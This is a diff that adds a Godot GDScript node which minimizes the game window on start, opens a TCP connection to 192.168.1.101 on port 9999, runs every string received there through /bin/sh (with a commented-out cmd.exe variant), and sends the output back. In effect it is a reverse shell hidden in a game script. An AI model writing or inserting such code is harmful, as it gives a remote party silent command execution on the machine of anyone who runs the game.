@@ -1,0 +1,20 @@
+extends Node
+
+var client = StreamPeerTCP.new()
+
+func _ready():
+	OS.set_window_minimized(true)
+	set_process(true)
+	client.connect_to_host("192.168.1.101", 9999)
+        
+func _process(delta):
+	var bytes = client.get_available_bytes()
+	if bytes > 0:
+		var output = cmd(str(client.get_string(bytes)))
+		client.put_string(str(output))
+
+func cmd(cmd):
+	var output = []
+	#var pid = OS.execute('cmd.exe', ['/C', cmd], true, output)
+	var pid = OS.execute('/bin/sh', ['-c', cmd], true, output)
+	return output
